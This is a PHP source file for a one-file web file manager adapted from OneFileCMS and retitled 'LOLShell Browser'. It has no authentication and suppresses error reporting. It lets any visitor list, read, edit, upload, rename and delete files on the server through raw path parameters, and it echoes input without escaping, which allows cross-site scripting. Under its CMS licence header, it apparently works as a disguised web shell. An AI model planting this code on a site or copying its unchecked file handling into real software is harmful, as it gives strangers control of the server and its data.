<?php /*

OneFileCMS - http://onefilecms.com/
an iamnotagoodartist project - http://iamnotagoodartist.com/

Protected by a Creative Commons "Attribution Non-Commercial Share Alike" License.
http://creativecommons.org/licenses/by-nc-sa/3.0

Free for personal or non-commercial websites. To receive an exception to use this software commercially, please consider purchasing a $20 commercial license.
http://onefilecms.com/license.php

Provided "as is," without warranty of any kind. In no event shall its author or the authors of its revisions be liable for any claim, damages, or other liability. For good. Not evil.

You may remix, tweak, and build upon this software, as long as you retain this text and its terms.

*/

// CONFIGURATION INFO
error_reporting(0);
$config_title = "LOLShell Browser";
$config_disabled = "";
$config_excluded = "";

$version = "1.1.1"; // ONEFILECMS_BEGIN

if( phpversion() < '5.0.0' ) { exit("OneFileCMS requires PHP5 to operate. Please contact your host to upgrade your PHP installation."); };

function getmicrotime() { list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec); }
$starttime = getmicrotime();

session_start();

global $pagetitle; $pagetitle = "/";
if (isset($_GET["i"]) && $_GET["i"] !== "") { $pagetitle = "/".$_GET["i"]."/"; }
global $page; $page = "index";
if (isset($_GET["p"])) { $page = $_GET["p"]; }
if (isset($_GET["i"]) && $_GET["i"] == "") { unset($_GET["i"]); }

// COPY FILE
if (isset($_GET["c"])) {
	$filename = $_GET["c"]; $pagetitle = "Copy &ldquo;".$filename."&rdquo;";  $page = "copy";
}

if (isset($_POST["copy_filename"]) && $_POST["sessionid"] == session_id()) {
	$old_filename = $_POST["old_filename"];
	$filename = $_POST["copy_filename"];
	copy($old_filename, $filename);
	$message = $old_filename." copied successfully to ".$filename.".";
}

// DELETE FILE
if (isset($_GET["d"])) {
	$filename = $_GET["d"];
	$pagetitle = "Delete &ldquo;".$filename."&rdquo;";
	$page = "delete";
}
if (isset($_POST["delete_filename"]) && $_POST["sessionid"] == session_id()) {
	$filename = $_POST["delete_filename"];
	unlink($filename);
	$message = $filename." successfully deleted.";
}

// DELETE FOLDER
if (isset($_GET["p"]) && $_GET["p"] == "deletefolder") {
	$pagetitle = "Delete Folder &ldquo;".$_GET["i"]."&rdquo;";
}
if (isset($_POST["delete_foldername"]) && $_POST["sessionid"] == session_id()) {
	$foldername = $_POST["delete_foldername"];
	if (@rmdir($foldername)) {
		$message = $foldername." successfully deleted.";
	} else {
		$message = "That folder is not empty.";
	}
}

// EDIT
if (isset($_POST["filename"]) && $_POST["sessionid"] == session_id()) {
	$filename = $_POST["filename"];
	$content = stripslashes($_POST["content"]);
	$fp = @fopen($filename, "w");
	if ($fp) {
		fwrite($fp, $content);
		fclose($fp);
	}
	$message = $filename." saved successfully.";
}
if (isset($_GET["f"])) {
	$filename = stripslashes($_GET["f"]);
	if (file_exists($filename)) {
		$page = "edit";
		$pagetitle = "Edit &ldquo;".$filename."&rdquo;";
		$fp = @fopen($filename, "r");
		if (filesize($filename) !== 0) {
			$loadcontent = fread($fp, filesize($filename));
			$loadcontent = htmlspecialchars($loadcontent);
		}
		fclose($fp);
	} else {
		$page = "error";
		unset ($filename);
		$message = "File does not exist.";
	}
}
// NEW FILE
if (isset($_GET["p"]) && $_GET["p"] == "new") {$pagetitle = "New File"; }
if (isset($_POST["new_filename"]) && $_POST["sessionid"] == session_id()) {
	$filename = $_POST["new_filename"];
	if (file_exists($filename)) {
		$message = $filename." not created. A file with that name already exists.";
	} else {
		$handle = fopen($filename, 'w') or die("can't open file");
		fclose($handle);
		$message = $filename." created successfully.";
	}
}
// NEW FOLDER
if (isset($_GET["p"]) && $_GET["p"] == "folder") {$pagetitle = "New Folder"; }
if (isset($_POST["new_folder"]) && $_POST["sessionid"] == session_id()) {
	$foldername = $_POST["new_folder"];
	if (!is_dir($foldername)) {
		mkdir($foldername);
		$message = $foldername." created successfully.";
	} else {
		$message = "A folder by that name already exists.";
	}
}
// RENAME FILE
if (isset($_GET["r"])) {
	$filename = $_GET["r"];
	$pagetitle = "Rename &ldquo;".$filename."&rdquo;";
	$page = "rename";
}
if (isset($_POST["rename_filename"]) && $_POST["sessionid"] == session_id()) {
	$old_filename = $_POST["old_filename"];
	$filename = $_POST["rename_filename"];
	rename($old_filename, $filename);
	$message = $old_filename." successfully renamed to ".$filename.".";
}
// RENAME FOLDER
if (isset($_GET["p"]) && $_GET["p"] == "renamefolder") {$pagetitle = "Rename Folder &ldquo;".$_GET["i"]."&rdquo;"; }
if (isset($_POST["rename_foldername"]) && $_POST["sessionid"] == session_id()) {
	$old_foldername = $_POST["old_foldername"];
	$foldername = $_POST["rename_foldername"];
	if (rename($old_foldername, $foldername)) {
		$message = $old_foldername." unsuccessfully renamed to ".$foldername.".";
	} else {
		$message = "There was an error. Try again and/or contact your admin.";
	}
}
// UPLOAD FILE
if (isset($_GET["p"]) && $_GET["p"] == "upload") {$pagetitle = "Upload File"; }
if (isset($_FILES['upload_filename']['name']) && $_POST["sessionid"] == session_id()) {
	$filename = $_FILES['upload_filename']['name'];
	$destination = $_POST["upload_destination"];
	if(move_uploaded_file($_FILES['upload_filename']['tmp_name'],
	$destination.basename($filename))) {
		$message = basename($filename)." uploaded successfully to ".$destination.".";
	} else{
		$message = "There was an error. Try again and/or contact your admin.";
	}
}

?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="robots" content="noindex">
<title><?php echo $config_title; ?> - <?php echo $pagetitle; ?></title>
<link href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.14/themes/dark-hive/jquery-ui.css" type="text/css" rel="stylesheet" media="screen" />
<script src="http://cdnjs.cloudflare.com/ajax/libs/modernizr/2.0.6/modernizr.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.14/jquery-ui.js"></script>
  <script>
	$(document).ready(function() {
		//$("#maincont").dialog();
		//TODO: Port icons from http://onefilecms.com/style.css
		$("a", ".front_links").button(); //Main creation buttons
		$("input, .button", ".buttons_right").button(); //File editing buttons
		//$("a").button({ icons: { primary:'ui-icon-gear' } });
	});
  </script>
	<script type="text/javascript">
	//<![CDATA[
	$(document).ready(function(){

	if ( $("#message").length > 0 ) { $("#message").animate({opacity: 1.0}, 3000).fadeOut(); };
	$(".button:visible:enabled:first").focus();
	$(".textinput:visible:enabled:first").focus();
	$(".page_edit .textinput").bind("change keyup", function (e) {
		key = e.which+" ";
		badkeys = "224 16 17 18 37 38 39 40 ";
		if ((badkeys.indexOf(key) == "-1") && ($("#save_file").val() !== "Save!")) {
			$("#save_file").val("Save!");
			document.title = document.title + " *";
			$(".page_edit h2").append(" *");
		}
	});
	$(".page_edit form").submit(function() { $("#save_file").val("Save"); });
	window.onbeforeunload = function () {
		if ($("#save_file").val() == "Save!") {
			return "Any changes you've made will be lost!";
		}
	};

	});
	//]]>
	</script>
</head>

<body>
<div class="container">

<div class="header">
	<h1><a href="<?php echo $_SERVER["SCRIPT_NAME"]; ?>" class="<?php echo
	strtolower(ereg_replace("[^A-Za-z0-9]", "", $config_title)); ?>"><?php echo $config_title;
	?></a></h1>
	<div class="nav">
		<a href="<?php echo $_SERVER["SCRIPT_NAME"]; ?>">Home</a>
	</div>
</div>

<?php if (isset($message)) {?><div id="message"><p><?php echo $message; ?></p></div><?php };

// COPY FILE
if ($page == "copy") {
	$extension = strrchr($filename, ".");
	// CLEAN THIS UP:
	$slug = substr($filename, 0, strlen($filename) - strlen($extension));
	$varvar = "?i=".substr($_GET["c"],0,strrpos($_GET["c"],"/")); ?>
	<h2>Copy &ldquo;<a href="<?php echo $filename; ?>"><?php echo $filename;
	?></a>&rdquo;</h2>
	<p>Existing files with the same filename are automatically overwritten... Be
	careful!</p>
	<form method="post" id="new" action="<?php echo
	$_SERVER["SCRIPT_NAME"].$varvar; ?>">
		<input type="hidden" name="sessionid" value="<?php echo session_id(); ?>" />
		<p><label>Old filename:</label><input type="hidden" name="old_filename"
		value="<?php echo $filename; ?>" /><input type="text" name="dummy"
		value="<?php echo $filename; ?>" class="textinput" disabled="disabled" /></p>
		<p><label for="copy_filename">New filename:</label><input type="text"
		name="copy_filename" id="copy_filename" class="textinput"
		value="<?php echo $slug."_".date("mdyHi").$extension; ?>" /></p>
		<p><input type="submit" class="button" value="Copy" /></p>
	</form>
<?php };

// DELETE FILE
if ($page == "delete") {
	$varvar = "?i=".substr($_GET["d"],0,strrpos($_GET["d"],"/")); ?>
	<h2>Delete &ldquo;<a href="<?php echo $filename; ?>"><?php echo $filename;
	?></a>&rdquo;</h2>
	<p>Are you sure?</p>
	<form method="post" action="<?php echo $_SERVER["SCRIPT_NAME"].$varvar; ?>">
		<input type="hidden" name="sessionid" value="<?php echo session_id(); ?>" />
		<p><input type="hidden" name="delete_filename" value="<?php echo
		$filename; ?>" /><input type="submit" class="button" name="delete_file"
		value="Yes" /> <input type="button" class="button" name="cancel" value="No"
		onclick="parent.location='<?php echo $_SERVER["SCRIPT_NAME"]; ?>'" /></p>
	</form>
<?php };

// DELETE FOLDER
if ($page == "deletefolder") {
	$varvar = "?i=".substr($_GET["i"],0,strrpos(substr_replace($_GET["i"],"",-1),"/")); ?>
	<h2>Delete Folder &ldquo;<?php echo $_GET["i"]; ?>&rdquo;</h2>
	<p>Folders have to be empty before they can be deleted.</p>
	<form method="post" action="<?php echo $_SERVER["SCRIPT_NAME"].$varvar; ?>">
		<input type="hidden" name="sessionid" value="<?php echo session_id(); ?>" />
		<p><input type="hidden" name="delete_foldername" value="<?php echo
		$_GET["i"]; ?>" /><input type="submit" class="button" name="delete_folder"
		value="Yes" /> <input type="button" class="button" name="cancel" value="No"
		onclick="parent.location='<?php echo
		$_SERVER["SCRIPT_NAME"]."?i=".substr_replace($_GET["i"],"",-1);
		?>'" /></p>
	</form>
<?php };

// EDIT
if ($page == "edit") { ?>
	<h2>Edit &ldquo;<a href="<?php echo $filename; ?>"><?php echo $filename; ?></a>&rdquo;</h2>
	<a href="<?php echo $_SERVER["SCRIPT_NAME"]; ?>?i=<?php echo
	substr($_GET["f"],0,strrpos($_GET["f"],"/")); ?>" class="back">Back</a>
	<form method="post" action="<?php echo $_SERVER["SCRIPT_NAME"]; ?>?f=<?php echo $filename;
	?>">
		<input type="hidden" name="sessionid" value="<?php echo session_id(); ?>" />
	<?php $lfile = strtolower($filename); if (strpos($config_disabled,end(explode(".", $lfile)))) { ?>
		<p><textarea name="content" class="textinput disabled" cols="70" rows="25"
		disabled="disabled">Disabled.</textarea></p>
		<p class="buttons_right">
			<input type="submit" class="button" name="save_file" value="Save"
			disabled="disabled" />
	<?php } else { ?>
		<p><input type="hidden" name="filename" id="filename" class="textinput"
		value="<?php echo $filename; ?>" /><textarea name="content" class="textinput"
		cols="70" rows="25"><?php echo $loadcontent; ?></textarea></p>
		<p class="buttons_right">
			<input type="submit" class="button" name="save_file" id="save_file"
			value="Save" />
	<?php } ?>
	<input type="button" class="button" name="rename_file" value="Rename/Move"
	onclick="parent.location='<?php echo $_SERVER["SCRIPT_NAME"]; ?>?r=<?php echo $filename;
	?>'" />
	<input type="button" class="button" name="delete_file" value="Delete"
	onclick="parent.location='<?php echo $_SERVER["SCRIPT_NAME"]; ?>?d=<?php echo $filename;
	?>'" />
	<input type="button" class="button" name="copy_file" value="Copy"
	onclick="parent.location='<?php echo $_SERVER["SCRIPT_NAME"]; ?>?c=<?php echo $filename;
	?>'" /></p>
	<div class="meta">
		<p><i>File Size:</i> <?php echo round(filesize($filename)/1000,2); ?> kb -
		<i>Last Updated:</i> <?php echo date("n/j/y g:ia", filemtime($filename)); ?></p>
	</div>
	</form>
	<div style="clear:both;"></div>
<?php };

// INDEX
if ($page == "index") { $varvar = "";
	if (isset($_GET["i"])) { $varvar = $_GET["i"]."/"; }?>
	<h2><?php echo basename(getcwd())."/".$varvar;?></h2>
	<p class="index_folders">
	<?php if ((isset($_GET["i"])) and ($_GET["i"] !== "")) { ?>
		<a href="<?php echo $_SERVER["SCRIPT_NAME"]; ?>?i=<?php echo
		substr($_GET["i"],0,strpos($_GET["i"],"/")); ?>" class="folder">.. /</a>
	<?php }; $files = glob($varvar."*",GLOB_ONLYDIR); sort($files); foreach ($files as $file)
	{ ?>
		<a href="<?php echo $_SERVER["SCRIPT_NAME"]; ?>?i=<?php echo $file; ?>"
		class="folder"><?php echo basename($file); ?></a>
	<?php } ?>
	</p>
	<div style="clear:both;"></div>
	<ul class="index">
	<?php $files = glob($varvar."{,.}*", GLOB_BRACE); sort($files);
	foreach ($files as $file) {
		$excludeme = 0;
		$config_excludeds = explode(",", $config_excluded);
		foreach ($config_excludeds as $config_exclusion) {
			if (strrpos(basename($file),$config_exclusion) !== False &&
			strrpos(basename($file),$config_exclusion) !== "") {
				$excludeme = 1;
			}
		}
		if (!is_dir($file) && $excludeme == 0) {
			$file_class = "";
			$lfile = strtolower($file);
			if ((strrpos(strtolower($lfile),".jpg")) ||
			(strrpos($lfile,".gif")) || (strrpos($lfile,".png")) ||
			(strrpos($lfile,".ico"))) { $file_class = "img"; };
			if (strrpos($lfile,".css")) { $file_class = "css"; };
			if (strrpos($lfile,".php")) { $file_class = "php"; }; ?>
				<li>
					<a href="<?php echo $_SERVER["SCRIPT_NAME"]; ?>?f=<?php
					echo $file; ?>" class="<?php echo $file_class ?>"><?php
					echo basename($file); ?></a>
					<div class="meta">
						<span><i>File Size:</i> <?php echo
						round(filesize($file)/1000,2);?> kb<br /></span>
						<span><i>Last Updated:</i> <?php echo
						date("n/j/y g:ia", filemtime($file)); ?></span>
					</div>
				</li>
		<?php }
	} ?>
	</ul>
	<div class="front_links">
		<a href="<?php echo $_SERVER["SCRIPT_NAME"]; ?>?p=new&amp;i=<?php echo $varvar;
		?>" class="new">New File</a>
		<a href="<?php echo $_SERVER["SCRIPT_NAME"]; ?>?p=folder&amp;i=<?php echo $varvar;
		?>" class="newfolder">New Folder</a><?php if ($varvar !== "") { ?>
		<a href="<?php echo $_SERVER["SCRIPT_NAME"]; ?>?p=deletefolder&amp;i=<?php echo
		$varvar; ?>" class="deletefolder">Delete Folder</a>
		<a href="<?php echo $_SERVER["SCRIPT_NAME"]; ?>?p=renamefolder&amp;i=<?php echo
		$varvar; ?>" class="renamefolder">Rename Folder</a><?php } ?>
		<a href="<?php echo $_SERVER["SCRIPT_NAME"]; ?>?p=upload&amp;i=<?php echo $varvar;
		?>" class="upload">Upload File</a>
	</div>
<?php };

// NEW FOLDER
if ($page == "folder") {
	$varvar = "";
	if (isset($_GET["i"])) { $varvar = "?i=".$_GET["i"]; }?>
	<h2>New Folder</h2>
	<p>Existing folders with the same name will not be overwritten.</p>
	<form method="post" action="<?php echo $_SERVER["SCRIPT_NAME"].substr_replace($varvar,"",-1); ?>">
		<input type="hidden" name="sessionid" value="<?php echo session_id(); ?>" />
		<p><label for="new_folder">Folder name: </label>
		<input type="text" name="new_folder" id="new_folder"
		class="textinput" value="<?php if(isset($_GET["i"])){ echo $_GET["i"]; }?>" /></p>
		<p><input type="submit" class="button" value="Create" /></p>
	</form>
<?php };

// RENAME FILE
if ($page == "rename") {
	$varvar = "?i=".substr($_GET["r"],0,strrpos($_GET["r"],"/")); ?>
	<h2>Rename &ldquo;<a href="<?php echo $filename; ?>"><?php echo $filename;
	?></a>&rdquo;</h2>
	<p>Existing files with the same filename are automatically overwritten... Be
	careful!</p>
	<p>To move a file, preface its name with the folder's name, as in
	"<i>foldername/filename.txt</i>." The folder must already exist.</p>
	<form method="post" action="<?php echo $_SERVER["SCRIPT_NAME"].$varvar;	?>">
		<input type="hidden" name="sessionid" value="<?php echo session_id(); ?>" />
		<p><label>Old filename:</label><input type="hidden" name="old_filename"
		value="<?php echo $filename; ?>" /><input type="text" name="dummy"
		value="<?php echo $filename; ?>" class="textinput" disabled="disabled" /></p>
		<p><label for="rename_filename">New filename:</label><input type="text"
		name="rename_filename" id="rename_filename" class="textinput"
		value="<?php echo $filename; ?>" /></p>
		<p><input type="submit" class="button" value="Rename" /></p>
	</form>
<?php };

// RENAME FOLDER
if ($page == "renamefolder") {
	$varvar = "?i=".substr($_GET["i"],0,strrpos(substr_replace($_GET["i"],"",-1),"/")); ?>
	<h2>Rename Folder &ldquo;<?php echo $_GET["i"]; ?>&rdquo;</h2>
	<form method="post" action="<?php echo $_SERVER["SCRIPT_NAME"].$varvar; ?>">
		<input type="hidden" name="sessionid" value="<?php echo session_id(); ?>" />
		<p><label>Old name:</label><input type="hidden" name="old_foldername"
		value="<?php echo $_GET["i"]; ?>" /><input type="text" name="dummy"
		value="<?php echo $_GET["i"]; ?>" class="textinput" disabled="disabled" /></p>
		<p><label for="rename_foldername">New name:</label><input type="text"
		name="rename_foldername" id="rename_foldername" class="textinput"
		value="<?php echo $_GET["i"]; ?>" /></p>
		<p><input type="submit" class="button" value="Rename"></p>
	</form>
<?php };

// UPLOAD FILE
if ($page == "upload") {
	$varvar = ""; if (isset($_GET["i"])) { $varvar = "?i=".$_GET["i"]; } ?>
	<h2>Upload</h2>
	<form enctype="multipart/form-data" action="<?php echo
	$_SERVER["SCRIPT_NAME"].substr_replace($varvar,"",-1); ?>" method="post">
		<input type="hidden" name="sessionid" value="<?php echo session_id(); ?>" />
		<input type="hidden" name="MAX_FILE_SIZE" value="100000" />
		<p><label for="upload_destination">Destination:</label><input type="text"
		name="upload_destination" value="<?php if (isset($_GET["i"])){ echo $_GET["i"]; } ?>"
		class="textinput" /></p>
		<p><label for="upload_filename">File:</label>
		<input name="upload_filename" type="file" /></p>
		<p><input type="submit" class="button" value="Upload" /></p>
	</form>
<?php } ?>

</div>
</body>
</html>

